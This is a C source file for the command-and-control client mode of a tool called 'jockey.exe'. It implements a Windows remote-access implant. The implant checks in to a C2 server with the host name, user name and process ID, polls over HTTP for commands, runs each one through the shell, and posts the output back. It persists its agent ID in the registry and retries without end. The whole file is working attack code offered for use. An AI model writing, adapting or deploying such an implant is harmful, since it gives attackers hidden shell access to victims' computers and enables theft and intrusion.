/*
 * agent_c2.c — C2 client mode for jockey.exe
 *
 * Usage: jockey.exe --c2 [--c2-url http://host:8080] [--c2-key xxx] [--win-srv http://host:9090]
 *
 * Protocol (matches linux/web/c2_server.py):
 *   1. POST /agent/checkin  {id?, hostname, user, os, arch, pid}
 *   2. GET  /agent/beacon/<id>  (long-poll, 30s timeout)
 *      → {cmd_id, cmd}  or  204
 *   3. Run cmd via shell
 *   4. POST /agent/result/<id>  {cmd_id, result}
 *   5. Loop
 *
 * Agent ID persisted in registry: HKCU\Software\Jockey\AgentId
 */

#include "jockey_vm.h"
#include "jky_platform.h"

#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define C2_DEFAULT_URL  "http://127.0.0.1:8080"
#define C2_DEFAULT_KEY  "changeme-agent-key"
#define C2_AGENT_PATH   "/agent"
#define BEACON_TIMEOUT  35
#define CMD_TIMEOUT     30
#define MAX_RECV        65536
#define MAX_SEND        8192
#define AGENT_ID_LEN    64
#define REG_PATH        "Software\\Jockey"

/* ------------------------------------------------------------------ */
/* minimal JSON helpers                                                  */
/* ------------------------------------------------------------------ */

static const char *json_skip(const char *p) {
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r') p++;
    return p;
}

static const char *json_match(const char *p, char c) {
    p = json_skip(p);
    if (*p == c) return p + 1;
    return NULL;
}

static int json_get_string(const char *p, const char *key,
                           char *out, int outsz) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *k = strstr(p, needle);
    if (!k) return -1;
    k += strlen(needle);
    k = json_skip(k);
    if (*k != ':') return -1;
    k = json_skip(k + 1);
    if (*k != '"') return -1;
    k++;
    int i = 0;
    while (*k && *k != '"' && i < outsz - 1) {
        if (*k == '\\' && k[1]) { k++; }
        out[i++] = *k++;
    }
    out[i] = 0;
    return 0;
}

static int json_get_int(const char *p, const char *key, int64_t *out) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *k = strstr(p, needle);
    if (!k) return -1;
    k += strlen(needle);
    k = json_skip(k);
    if (*k != ':') return -1;
    k = json_skip(k + 1);
    *out = atoll(k);
    return 0;
}

/* ------------------------------------------------------------------ */
/* HTTP over raw TCP                                                     */
/* ------------------------------------------------------------------ */

typedef struct {
    SOCKET fd;
    char   host[256];
    int    port;
    char   recv_buf[MAX_RECV];
    int    recv_len;
} HttpConn;

static int http_connect(HttpConn *h, const char *url) {
    /* parse http://host:port/path */
    const char *p = url;
    if (strncmp(p, "http://", 7) == 0) p += 7;
    const char *slash = strchr(p, '/');
    const char *hostport = slash ? slash : p + strlen(p);

    char hp[256];
    int len = (int)(hostport - p);
    if (len >= (int)sizeof(hp)) return -1;
    memcpy(hp, p, len);
    hp[len] = 0;

    char *colon = strrchr(hp, ':');
    if (colon) {
        h->port = atoi(colon + 1);
        *colon = 0;
    } else {
        h->port = 80;
    }
    strncpy(h->host, hp, sizeof(h->host) - 1);

    h->fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (h->fd == INVALID_SOCKET) return -1;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)h->port);

    struct hostent *he = gethostbyname(h->host);
    if (!he) { closesocket(h->fd); return -1; }
    memcpy(&sa.sin_addr, he->h_addr, he->h_length);

    if (connect(h->fd, (struct sockaddr *)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(h->fd); return -1;
    }
    h->recv_len = 0;
    return 0;
}

static void http_close(HttpConn *h) {
    if (h->fd != INVALID_SOCKET) { closesocket(h->fd); h->fd = INVALID_SOCKET; }
}

static int http_send(HttpConn *h, const char *data, int len) {
    int sent = 0;
    while (sent < len) {
        int r = send(h->fd, data + sent, len - sent, 0);
        if (r <= 0) return -1;
        sent += r;
    }
    return 0;
}

static int http_recv_body(HttpConn *h, char *body, int maxlen) {
    int total = 0;
    int content_len = -1;
    int got_headers = 0;

    while (total < maxlen - 1) {
        int r = recv(h->fd, h->recv_buf + h->recv_len,
                     sizeof(h->recv_buf) - h->recv_len - 1, 0);
        if (r <= 0) break;
        h->recv_len += r;
        h->recv_buf[h->recv_len] = 0;

        if (!got_headers) {
            char *hdrend = strstr(h->recv_buf, "\r\n\r\n");
            if (hdrend) {
                got_headers = 1;
                const char *cl = strstr(h->recv_buf, "Content-Length: ");
                if (cl) content_len = atoi(cl + 16);
                char *body_start = hdrend + 4;
                int body_got = h->recv_len - (int)(body_start - h->recv_buf);
                if (body_got > 0) {
                    int copy = (body_got < maxlen - 1) ? body_got : maxlen - 1;
                    memcpy(body, body_start, copy);
                    total = copy;
                    body[total] = 0;
                }
                if (content_len >= 0 && total >= content_len) break;
                if (content_len < 0 && total > 0) break;
            }
        } else if (content_len >= 0) {
            int body_got = h->recv_len; /* all remaining is body */
            int copy = ((total + body_got) < maxlen - 1) ? body_got : maxlen - 1 - total;
            memcpy(body + total, h->recv_buf, copy);
            total += copy;
            body[total] = 0;
            if (total >= content_len) break;
        }
    }
    return total;
}

static int http_get(HttpConn *h, const char *path, char *resp, int maxlen) {
    char req[MAX_SEND];
    snprintf(req, sizeof(req),
             "GET %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "X-Agent-Key: %s\r\n"
             "Connection: close\r\n"
             "\r\n",
             path, h->host, h->port, C2_DEFAULT_KEY);
    return (http_send(h, req, (int)strlen(req)) == 0) ?
           http_recv_body(h, resp, maxlen) : -1;
}

static int http_post(HttpConn *h, const char *path,
                     const char *ctype, const char *body,
                     char *resp, int maxlen) {
    char req[MAX_SEND];
    int blen = (int)strlen(body);
    snprintf(req, sizeof(req),
             "POST %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "X-Agent-Key: %s\r\n"
             "Content-Type: %s\r\n"
             "Content-Length: %d\r\n"
             "Connection: close\r\n"
             "\r\n",
             path, h->host, h->port, C2_DEFAULT_KEY, ctype, blen);
    if (http_send(h, req, (int)strlen(req)) != 0) return -1;
    if (http_send(h, body, blen) != 0) return -1;
    return http_recv_body(h, resp, maxlen);
}

/* ------------------------------------------------------------------ */
/* registry persistence for agent ID                                    */
/* ------------------------------------------------------------------ */

static void agent_id_save(const char *id) {
    HKEY hk;
    if (RegCreateKeyA(HKEY_CURRENT_USER, REG_PATH, &hk) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "AgentId", 0, REG_SZ,
                       (const BYTE *)id, (DWORD)(strlen(id) + 1));
        RegCloseKey(hk);
    }
}

static int agent_id_load(char *out, int outsz) {
    HKEY hk;
    DWORD type = 0, sz = (DWORD)outsz;
    if (RegOpenKeyA(HKEY_CURRENT_USER, REG_PATH, &hk) != ERROR_SUCCESS) return -1;
    int r = RegQueryValueExA(hk, "AgentId", NULL, &type, (LPBYTE)out, &sz);
    RegCloseKey(hk);
    if (r != ERROR_SUCCESS || type != REG_SZ) return -1;
    out[outsz - 1] = 0;
    return 0;
}

/* ------------------------------------------------------------------ */
/* shell command execution                                              */
/* ------------------------------------------------------------------ */

static int run_shell(const char *cmd, char *out, int outsz) {
    FILE *fp = _popen(cmd, "r");
    if (!fp) { snprintf(out, outsz, "[exec failed]"); return -1; }
    int n = 0;
    while (n < outsz - 1) {
        int c = fgetc(fp);
        if (c == EOF) break;
        out[n++] = (char)c;
    }
    out[n] = 0;
    _pclose(fp);
    return n;
}

/* ------------------------------------------------------------------ */
/* C2 main loop                                                         */
/* ------------------------------------------------------------------ */

static void c2_loop(const char *c2_url) {
    char agent_id[AGENT_ID_LEN] = {0};
    char hostname[128] = "unknown";
    char username[128] = "unknown";

    DWORD sz = sizeof(hostname) - 1;
    GetComputerNameA(hostname, &sz);
    sz = sizeof(username) - 1;
    GetUserNameA(username, &sz);

    if (agent_id_load(agent_id, sizeof(agent_id)) != 0) {
        snprintf(agent_id, sizeof(agent_id), "%08x",
                 (unsigned)(GetTickCount() ^ (uintptr_t)&c2_loop));
    }

    printf("[c2] url=%s key=%s agent=%s\n", c2_url, C2_DEFAULT_KEY, agent_id);
    fflush(stdout);

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    char c2_host[256] = {0};
    int  c2_port = 80;
    const char *p = strstr(c2_url, "http://");
    if (p) p += 7; else p = c2_url;
    const char *slash = strchr(p, '/');
    const char *path = slash ? slash : "/";
    if (slash) {
        int len = (int)(slash - p);
        if (len < (int)sizeof(c2_host)) {
            memcpy(c2_host, p, len);
            c2_host[len] = 0;
        }
    } else {
        strncpy(c2_host, p, sizeof(c2_host) - 1);
    }
    char *colon = strrchr(c2_host, ':');
    if (colon) { c2_port = atoi(colon + 1); *colon = 0; }

    int consecutive_failures = 0;

    for (;;) {
        HttpConn conn;
        memset(&conn, 0, sizeof(conn));
        conn.port = c2_port;
        strncpy(conn.host, c2_host, sizeof(conn.host) - 1);

        if (http_connect(&conn, c2_url) != 0) {
            printf("[c2] connect failed, retrying in 5s\n");
            fflush(stdout);
            Sleep(5000);
            continue;
        }

        printf("[c2] connected to %s\n", c2_url);
        fflush(stdout);
        consecutive_failures = 0;

        /* ---- checkin ---- */
        char checkin_body[MAX_SEND];
        char checkin_resp[MAX_RECV];
        snprintf(checkin_body, sizeof(checkin_body),
            "{\"id\":\"%s\",\"hostname\":\"%s\",\"user\":\"%s\","
            "\"os\":\"Windows\",\"arch\":\"%s\",\"pid\":%d}\n",
            agent_id[0] ? agent_id : "",
            hostname, username,
#ifdef _WIN64
            "x64",
#else
            "x86",
#endif
            (int)GetCurrentProcessId());

        /* Use agent_id in path only after first checkin */
        char checkin_path[512];
        if (agent_id[0]) {
            snprintf(checkin_path, sizeof(checkin_path),
                     "%s/checkin", C2_AGENT_PATH);
        } else {
            snprintf(checkin_path, sizeof(checkin_path),
                     "%s/checkin", C2_AGENT_PATH);
        }

        if (http_post(&conn, checkin_path, "application/json",
                      checkin_body, checkin_resp, sizeof(checkin_resp)) > 0) {
            char new_id[AGENT_ID_LEN] = {0};
            if (json_get_string(checkin_resp, "id", new_id, sizeof(new_id)) == 0
                && new_id[0]) {
                if (strcmp(new_id, agent_id) != 0) {
                    strncpy(agent_id, new_id, sizeof(agent_id) - 1);
                    agent_id_save(agent_id);
                    printf("[c2] assigned id %s\n", agent_id);
                }
            }
        }

        /* ---- beacon loop ---- */
        int beacon_ok = 1;
        while (beacon_ok) {
            char beacon_path[512];
            snprintf(beacon_path, sizeof(beacon_path),
                     "%s/beacon/%s", C2_AGENT_PATH, agent_id);

            /* Reconnect per beacon to avoid stale connections */
            http_close(&conn);
            if (http_connect(&conn, c2_url) != 0) {
                beacon_ok = 0;
                break;
            }

            char beacon_resp[MAX_RECV];
            int rlen = http_get(&conn, beacon_path, beacon_resp, sizeof(beacon_resp));

            if (rlen <= 0) {
                beacon_ok = 0;
                break;
            }

            /* Check for HTTP status in response */
            if (strstr(beacon_resp, "204") && strstr(beacon_resp, "No Content")) {
                /* No command, sleep and retry */
                Sleep(3000);
                continue;
            }

            /* Parse command */
            char cmd_id[32] = {0};
            char cmd_text[4096] = {0};
            int64_t cid = 0;

            json_get_int(beacon_resp, "cmd_id", &cid);
            json_get_string(beacon_resp, "cmd", cmd_text, sizeof(cmd_text));

            if (cid == 0 || cmd_text[0] == 0) {
                Sleep(3000);
                continue;
            }

            printf("[c2] cmd #%lld: %s\n", (long long)cid, cmd_text);
            fflush(stdout);

            /* Execute command */
            char result[4096] = {0};
            run_shell(cmd_text, result, sizeof(result));

            /* Submit result */
            char result_path[512];
            snprintf(result_path, sizeof(result_path),
                     "%s/result/%s", C2_AGENT_PATH, agent_id);

            char result_body[MAX_SEND];
            /* Minimal JSON — escape backslashes and quotes */
            char escaped[4096];
            int ei = 0;
            for (int i = 0; result[i] && ei < sizeof(escaped) - 2; i++) {
                if (result[i] == '\\') escaped[ei++] = '\\';
                else if (result[i] == '"') { escaped[ei++] = '\\'; }
                escaped[ei++] = result[i];
            }
            escaped[ei] = 0;

            snprintf(result_body, sizeof(result_body),
                "{\"cmd_id\":%lld,\"result\":\"%s\"}",
                (long long)cid, escaped);

            http_close(&conn);
            if (http_connect(&conn, c2_url) == 0) {
                char dummy[MAX_RECV];
                http_post(&conn, result_path, "application/json",
                          result_body, dummy, sizeof(dummy));
            }
        }

        consecutive_failures++;
        if (consecutive_failures > 10) {
            printf("[c2] too many failures, sleeping 30s\n");
            fflush(stdout);
            Sleep(30000);
            consecutive_failures = 0;
        } else {
            Sleep(5000);
        }
    }

    /* not reached — the loop above never exits */
    WSACleanup();
}

/* ------------------------------------------------------------------ */
/* Entry point from main.c                                             */
/* ------------------------------------------------------------------ */

int agent_c2_main(int argc, char **argv) {
    const char *c2_url = C2_DEFAULT_URL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--c2-url") == 0 && i + 1 < argc)
            c2_url = argv[++i];
    }

    printf("[c2] starting client mode\n");
    fflush(stdout);
    c2_loop(c2_url);
    return 0;
}